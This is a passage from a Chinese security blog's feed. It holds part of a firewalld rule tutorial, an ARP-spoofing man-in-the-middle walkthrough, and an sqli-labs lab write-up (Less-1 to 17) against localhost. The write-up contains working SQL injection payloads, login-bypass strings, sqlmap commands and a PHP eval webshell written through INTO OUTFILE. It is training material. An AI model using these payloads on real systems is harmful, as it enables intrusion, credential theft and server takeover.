[P]</span><br><span class="line">  --query-rule &#123;ipv4|ipv6|eb&#125; &lt;table&gt; &lt;chain&gt; &lt;priority&gt; &lt;arg&gt;...</span><br><span class="line">                       Return whether a rule with priority has been added to</span><br><span class="line">                       Get all tracked passthrough rules [P]</span><br><span class="line">                       Get tracked passthrough rules [P]</span><br><span class="line">                       Add a new tracked passthrough rule [P]</span><br><span class="line">                       Remove a tracked passthrough rule [P]</span><br><span class="line">                       Return whether the tracked passthrough rule has been</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">增加一项规则：firewall-cmd [--zone=zone] --add-rich-rule=&apos;rule&apos;</span><br><span class="line">移除一项规则：firewall-cmd [--zone=zone] --remove-rich-rule=&apos;rule&apos;</span><br><span class="line">检查一项规则是否存在：firewall-cmd [--zone=zone] --query-rich-rule=&apos;rule&apos;</span><br></pre></td></tr></table></figure><p>举个列子：<br>允许从 192.168.67.130 到 web 服务器（80 号端口）的连接而阻塞 192.168.67.0/24 网络中的其它来源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --add-rich-rule &apos;rule family=&quot;ipv4&quot; source address=&quot;192 .168.67.130/24&quot; service name=&quot;http&quot; accept&apos;</span><br><span class="line">[root@localhost ~]# firewall-cmd --add-rich-rule &apos;rule family=&quot;ipv4&quot; source address=&quot;192 .168.67.0/24&quot; service name=&quot;http&quot; drop&apos;</span><br></pre></td></tr></table></figure></p><p>–permanent永久生效<br>4、<strong>“Rich Language”多规则结构</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rule [family=&quot;&lt;rule family&gt;&quot;]</span><br><span class="line">[ source address=&quot;&lt;address&gt;&quot; [invert=&quot;True&quot;] ]</span><br><span class="line">destination address=&quot;&lt;address&gt;&quot; [invert=&quot;True&quot;] ]</span><br><span class="line">[ &lt;element&gt; ]</span><br><span class="line">[log [prefix=&quot;&lt;prefix text&gt;&quot;] [level=&quot;&lt;log level&gt;&quot;][limitvalue=&quot;rate/duration&quot;] ]</span><br><span class="line">[ audit ]</span><br><span class="line">[ accept|reject|drop ]</span><br></pre></td></tr></table></figure></p><blockquote><ul><li>source<br>源地址</li><li>sourcedestination<br>目标地址。</li><li>sourceservice<br>服务名称是 firewalld 提供的其中一种服务。命令为以下形式:<br>sourceservice name=service_name</li><li>port<br>可以是一个具体的端口，也可以是端口范围，例如，5060-5062。协议可以指定为 tcp 或 udp。命令为以下形式：<br>port port=number_or_range protocol=protocol</li><li>protocol<br>协议值可以是一个协议 ID 数字，或者一个协议名。预知可用协议，请查阅 /etc/protocols。命令为以下形式：<br>protocol value=protocol_name_or_ID</li><li>icmp-block<br>用这个命令阻绝一个或多个 ICMP 类型。 ICMP 类型是 firewalld 支持的 ICMP 类型之一。要获得被支持的 ICMP 类型列表，输入以下命令：<br>irewall-cmd –get-icmptypes<br>命令为以下形式<br>icmp-block name=icmptype_name</li><li>masquerade<br>打开规则里的 IP 伪装。</li><li>forward-port<br>从一个带有指定为 tcp 或 udp 协议的本地端口转发数据包到另一个本地端口，或另一台机器，或另一台机器上的另一个端口。 port 和 to-port 可以是一个单独的端口数字，或一个端口范围。而目的地址是一个简单的 IP 地址。这个命令为以下形式：<br>forward-port port=number_or_range protocol=protocol / to-port=number_or_range to-addr=address</li><li>log<br>写入日志，等级可以是 emerg 、 alert 、 crit 、 error 、warning 、 notice、 info 或者 debug 中的一个。语法如下：<br>log [prefix=prefix text] [level=log level] limit value=rate/duration<br>日志等级用正的自然数 [1, ..] 表达，持续时间的单位为 s 、 m 、 h 、 d 。 s 表示秒， m 表示分钟， h 表示小时， d 表示天。最大限定值是 1/d ，意为每天最多有一条日志。</li><li>audit<br>审核为发送到 auditd 服务。审核类型可以是 ACCEPT 、 REJECT 或 DROP 中的一种，但不能在 audit 命令后指定，因为审核类型将会从规则动作中自动收集。审核不包含自身参数，但可以选择性地增加限制。审核的使用是可选择的。</li><li>accept|reject|drop<br>规则动作。<br>accept | reject [type=reject type] | drop<br>选择 accept 所有新的连接请求都会被允许。选择 reject ，连接将被拒绝，连接来源将接到一个拒绝信息。选择 drop ， 所有数据包会被丢弃，并且不会向来源地发送任何信息。</li></ul></blockquote><p>列如:同意来自 192.168.0.0/24 网络的IP地址使用ipv4访问本机的http，并且每一分钟写入一次系统日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# firewall-cmd --add-rich-rule &apos;rule family=&quot;ipv4&quot; source address=&quot;192.168.0.0/24&quot; service name=&quot;http&quot; log prefix=&quot;http&quot; level=&quot;info&quot; limit value=&quot;1/m&quot; accept&apos;</span><br></pre></td></tr></table></figure></p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/04/04/5ca58a69f1e58.png" alt="d9d46d06022fb2745c849ca766a2878d.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;iptables&quot;&gt;&lt;a href=&quot;#iptables&quot; class=&quot;headerlink&quot; title=&quot;iptables&quot;&gt;&lt;/a&gt;iptables&lt;/h2&gt;&lt;p&gt;netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，具有完成封包过滤、封包重定向和网络地址转换（NAT）等功能。netfilter是Linux 核心中一个通用架构，它提供了一系列的”表”(tables)，每个表由若干”链”(chains)组成，而每条链中可以有一条或数条规则(rule)组成。可以这样来理解，netfilter是表的容器，表是链的容器，而链又是规则的容器。&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="防火墙" scheme="http://www.lanbainan.cn/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>中间人攻击-ARP毒化</title>
    <link href="http://www.lanbainan.cn/2019/04/03/2019-04-03/"/>
    <id>http://www.lanbainan.cn/2019/04/03/2019-04-03/</id>
    <published>2019-04-02T16:00:00.000Z</published>
    <updated>2019-04-08T02:56:56.349Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ARP毒化"><a href="#ARP毒化" class="headerlink" title="ARP毒化"></a>ARP毒化</h2><p>工作原理：当ARP工作时，需要向当前局域网发送以太网广播数据包，然后目标IP回应一个包含IP和MAC地址的数据包应答主机。<br><a id="more"></a></p><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h3><p>查看ARP缓存表<br><img src="https://i.loli.net/2019/04/03/5ca46c894395b.png" alt="1.png"><br><img src="https://i.loli.net/2019/04/03/5ca46c894663d.png" alt="2.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.67.1 192.168.67.129 #告诉网关我是靶机</span><br><span class="line">arpspoof -i eth0 -t 192.168.67.129 192.168.67.1 #告诉靶机我是网关</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward #开启ARP转发</span><br></pre></td></tr></table></figure></p><p><strong>driftnet</strong>能截获当前靶机浏览的图片<br><img src="https://i.loli.net/2019/04/03/5ca46c892275e.png" alt="4.png"><br><img src="https://i.loli.net/2019/04/03/5ca46c89528a9.png" alt="3.png"><br><strong>Wireshark</strong>捕捉数据包<br>还有可以嗅探账号密码之类的<br><img src="https://i.loli.net/2019/04/03/5ca47178ab4a3.png" alt="5.png"></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>ARP缓存表为静态，在大型网络中，但会被累死。<br>网关绑定主机MAC和IP，但是这是有限的<br>ARP防火墙（用钱解决问题）</p><h2 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h2><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a><br><img src="https://i.loli.net/2019/04/03/5ca473f2b1979.bmp" alt="31f9tvq1.bmp"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ARP毒化&quot;&gt;&lt;a href=&quot;#ARP毒化&quot; class=&quot;headerlink&quot; title=&quot;ARP毒化&quot;&gt;&lt;/a&gt;ARP毒化&lt;/h2&gt;&lt;p&gt;工作原理：当ARP工作时，需要向当前局域网发送以太网广播数据包，然后目标IP回应一个包含IP和MAC地址的数据包应答主机。&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="ARP" scheme="http://www.lanbainan.cn/tags/ARP/"/>
    
  </entry>
  
  <entry>
    <title>Sqls-Libs闯关（基础版）</title>
    <link href="http://www.lanbainan.cn/2019/03/28/2019-3-28/"/>
    <id>http://www.lanbainan.cn/2019/03/28/2019-3-28/</id>
    <published>2019-03-27T16:00:00.000Z</published>
    <updated>2019-04-08T02:01:27.703Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQLS-libs闯关测试（基础版）"><a href="#SQLS-libs闯关测试（基础版）" class="headerlink" title="SQLS-libs闯关测试（基础版）"></a>SQLS-libs闯关测试（基础版）</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>根据提示输入id<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1</span><br></pre></td></tr></table></figure></p><a id="more"></a><p><img src="https://i.loli.net/2019/03/27/5c9b75253d4bf.png" alt="1.png"><br>输入<code>&#39;</code>报错<br><img src="https://i.loli.net/2019/03/27/5c9b776f4b3f0.png" alt="2.png"><br>构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1&apos; and 1=1 --+</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/27/5c9b77e37919e.png" alt="3.png"><br>测字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 3</span><br></pre></td></tr></table></figure></p><p>测试交互字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1&apos; and 1=2  union select 1,2,3--+</span><br></pre></td></tr></table></figure></p><p>测出交互字段为<strong>2,3</strong><br>爆当前数据库库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1&apos; and 1=2  union select 1,database(),3--+</span><br></pre></td></tr></table></figure></p><p>得到结果<strong>security</strong><br>爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1&apos; and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = &apos;security&apos;),3 --+</span><br></pre></td></tr></table></figure></p><p>得到<strong>emails,referers,uagents,users</strong><br>爆字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1&apos; and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &apos;security&apos; and table_name=&apos;users&apos;),3 --+</span><br></pre></td></tr></table></figure></p><p>得到<strong>id,username,password</strong><br>爆数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-1/?id=1&apos; and 1=2 union select 1,(select group_concat(id,username,password) from security.users),3 --+</span><br></pre></td></tr></table></figure></p><p>得到数据<strong>you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4<br>Your Password:3</strong></p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>输入<code>&#39;</code>报错<br>测试<code>and 1=1</code>正确<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-2/?id=1 and 1=1</span><br></pre></td></tr></table></figure></p><p>同less-1</p><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>输入<code>&#39;</code>报错<br><img src="https://i.loli.net/2019/03/28/5c9c2dc895a18.png" alt="4.png"><br>根据提示将<code>&#39;&#39;1&#39;&#39;</code>加一个<code>）</code>将成功构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-3/?id=1&apos;) and 1=1--+</span><br></pre></td></tr></table></figure></p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>输入<code>&quot;</code>报错<br><img src="https://i.loli.net/2019/03/28/5c9c3281c82d4.png" alt="5.png"><br>根据提示加入<code>)</code>将成功构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-4/?id=1&quot;) and 1=1 --+</span><br></pre></td></tr></table></figure></p><h3 id="Less-5-单引号-双查询注入"><a href="#Less-5-单引号-双查询注入" class="headerlink" title="Less-5 单引号-双查询注入"></a>Less-5 单引号-双查询注入</h3><p>输入<code>&#39;</code>报错<br><img src="https://i.loli.net/2019/03/28/5c9c3765b7582.png" alt="6.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-5/?id=1&apos;--+</span><br></pre></td></tr></table></figure></p><p>回显正确，但不显示数据内容，采取利用错误提示暴露数据库数据<br><a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">双注入原理</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-5/?id=1&apos; and 1=1 union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure></p><p>值得注意的是双注入是有公式的<code>union select 1 from (select+count(*),concat(floor(rand(0)*2),( 注入爆数据语句))a from information_schema.tables group by a)b</code>，并且输出字符长度限制为64个字符。<br>通过调整<code>limit 0,1</code>爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-5/?id=1&apos; and 1=1 union select 1 from (select+count(*),concat(floor(rand(0)*2),0x7c,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))a from information_schema.tables group by a)b --+</span><br></pre></td></tr></table></figure></p><p>通过调整<code>limit 0,1</code>爆字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-5/?id=1&apos; and 1=1 union select 1 from (select+count(*),concat(floor(rand(0)*2),0x7c,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1))a from information_schema.tables group by a)b --+</span><br></pre></td></tr></table></figure></p><p>通过调整<code>limit 0,1</code>爆数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-5/?id=1&apos; and 1=1 union select 1 from (select+count(*),concat(floor(rand(0)*2),0x7c,(select concat(username,0x7c,password) from security.users limit 0,1))a from information_schema.tables group by a)b --+</span><br></pre></td></tr></table></figure></p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>输入<code>&quot;</code>报错<br>原理同Less-5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-6/?id=1&quot; and 1=1 union select 1 from (select+count(*),concat(floor(rand(0)*2),( select database()))a from information_schema.tables group by a)b--+</span><br></pre></td></tr></table></figure></p><h3 id="Less-7-写入文件"><a href="#Less-7-写入文件" class="headerlink" title="Less-7 写入文件"></a>Less-7 写入文件</h3><p>实在没头绪，祭出大杀器<strong>查看源码</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p><p>注意：一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）<br>回显正确<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-7/?id=1&apos;)) and 1=1--+</span><br></pre></td></tr></table></figure></p><p>插入一句话木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-7/?id=1&apos;)) and 1=1 union select 1,&apos;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;’,3 into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\sql\\Less-7\\test.php&quot;--+</span><br></pre></td></tr></table></figure></p><p>菜刀直连<br>注：这个路径这Less-7中，笔者没有爆出来</p><h3 id="Less-8-盲注-布尔"><a href="#Less-8-盲注-布尔" class="headerlink" title="Less-8 盲注-布尔"></a>Less-8 盲注-布尔</h3><p>盲注只有真和假<br>输入正常回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-8/?id=1&apos; and 1=1--+</span><br></pre></td></tr></table></figure></p><p>猜数据库长度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-8/?id=1&apos; and (length(database()))=8--+</span><br></pre></td></tr></table></figure></p><p>猜库名(使用二分法)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))=115--+</span><br></pre></td></tr></table></figure></p><p>猜表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)))=101--+</span><br></pre></td></tr></table></figure></p><p>猜字段(同理)<br><strong>用sqlmap跑</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Hacker~]# Sqlmap -u http://localhost/sql/Less-8/?id=1 --dbms mysql --batch -v 3 --current-db</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/28/5c9c7a98e8ada.png" alt="7.png"></p><h3 id="Less-9-盲注-时间"><a href="#Less-9-盲注-时间" class="headerlink" title="Less-9 盲注-时间"></a>Less-9 盲注-时间</h3><p>基于时间的盲注<br><img src="https://i.loli.net/2019/04/01/5ca15eff87186.png" alt="8.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-9/?id=1&apos; and sleep()--+</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca15effba19b.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@Hacker~]# Sqlmap -u http://localhost/sql/Less-9/?id=1 --dbms mysql --batch -v 3 --current-db</span><br></pre></td></tr></table></figure></p><h3 id="Less-10-盲注-时间"><a href="#Less-10-盲注-时间" class="headerlink" title="Less-10 盲注-时间"></a>Less-10 盲注-时间</h3><p>和上面一样的，单引号换双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-10/?id=1&quot; and sleep(5)--+</span><br></pre></td></tr></table></figure></p><p>注：1-10属于GET注入</p><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>POST注入一般用在登录绕过，获取数据库数据也是可以的。</p><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p><img src="https://i.loli.net/2019/04/01/5ca1671c2a4a2.png" alt="10.png"><br><img src="https://i.loli.net/2019/04/01/5ca1671befd1f.png" alt="11.png"><br><img src="https://i.loli.net/2019/04/01/5ca167a2aa550.png" alt="12.png"><br>爆数据和上面是Less-1一样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=test&amp;passwd=test&apos; or 1=1#</span><br></pre></td></tr></table></figure></p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>双引号加括号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=test&amp;passwd=test &quot;) or 1=1 #</span><br></pre></td></tr></table></figure></p><h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=test&amp;passwd=test&apos;) or 1=1#</span><br></pre></td></tr></table></figure><p>没有任何报错但是有盲注<br><img src="https://i.loli.net/2019/04/01/5ca1703403d56.png" alt="13.png"><br><img src="https://i.loli.net/2019/04/01/5ca170344fd84.png" alt="14.png"><br><strong>盲注测试</strong><br>将post请求包保存为test.txt<br><strong>参数：–technique</strong><br>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。<br>支持的探测方式如下：</p><blockquote><ul><li>B: Boolean-based blind SQL injection（布尔型注入）</li><li>E: Error-based SQL injection（报错型注入）</li><li>U: UNION query SQL injection（可联合查询注入）</li><li>S: Stacked queries SQL injection（可多语句查询注入）</li><li>T: Time-based blind SQL injection（基于时间延迟注入）</li></ul></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -r &apos;/root/Desktop/test.txt&apos; --technique E --batch -v 3 --current-db</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/01/5ca18e763555d.png" alt="15.png"></p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>和Less-13差不多操作,双引号闭合<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=test&amp;passwd=test&quot; or 1=1#</span><br></pre></td></tr></table></figure></p><p>盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -r &apos;/root/Desktop/test.txt&apos; --technique E --batch -v 3 --current-db</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1a13cf1823.png" alt="16.png"></p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>和Less-13差不多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=test&amp;passwd=test&apos; or 1=1 #</span><br></pre></td></tr></table></figure></p><p>还是盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -r &apos;/root/Desktop/test.txt&apos; --technique E --batch -v 3 --current-db</span><br></pre></td></tr></table></figure></p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=test&amp;passwd=test&quot;) or 1=1#</span><br></pre></td></tr></table></figure><p>盲注走起<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -r &apos;/root/Desktop/test.txt&apos; --technique E --batch -v 3 --current-db</span><br></pre></td></tr></table></figure></p><h3 id="Less-17-密码更新"><a href="#Less-17-密码更新" class="headerlink" title="Less-17 密码更新"></a>Less-17 密码更新</h3><p><img src="https://i.loli.net/2019/04/01/5ca1a4a9ddcf4.png" alt="17.png"><br>提示我们可以将更改密码<br>使用burp爆破出一个admin用户名<br><img src="https://i.loli.net/2019/04/01/5ca1ac2cba1fd.png" alt="18.png"><br>方法1：派生表注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=test&apos; and (select 1 from (select+count(*),concat(floor(rand(0)*2),0x7c,(select database()))a from information_schema.tables group by a)b)#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1b67164520.png" alt="19.png"><br>和Less-5很像是不是<br>方法2：updatexml<br>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Syntax:</span><br><span class="line">UpdateXML(xml_target, xpath_expr, new_xml)</span><br><span class="line">Examples:</span><br><span class="line">mysql&gt; SELECT</span><br><span class="line">    -&gt;   UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val1,</span><br><span class="line">    -&gt;   UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val2,</span><br><span class="line">    -&gt;   UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;//b&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val3,</span><br><span class="line">    -&gt;   UpdateXML(&apos;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val4,</span><br><span class="line">    -&gt;   UpdateXML(&apos;&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&apos;, &apos;/a/d&apos;, &apos;&lt;e&gt;fff&lt;/e&gt;&apos;) AS val5</span><br><span class="line">    -&gt; \G</span><br><span class="line"></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">val1: &lt;e&gt;fff&lt;/e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;e&gt;fff&lt;/e&gt;&lt;/a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>当<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">xpath</a>不符合语法时，该语句会报错XPATH syntax error:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=test&apos; and updatexml(1,concat(0x7c,(select database()),0x7c),1)#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/04/01/5ca1bc94c8262.png" alt="20.png"></p><h3 id="Less-18-User-Agent注入"><a 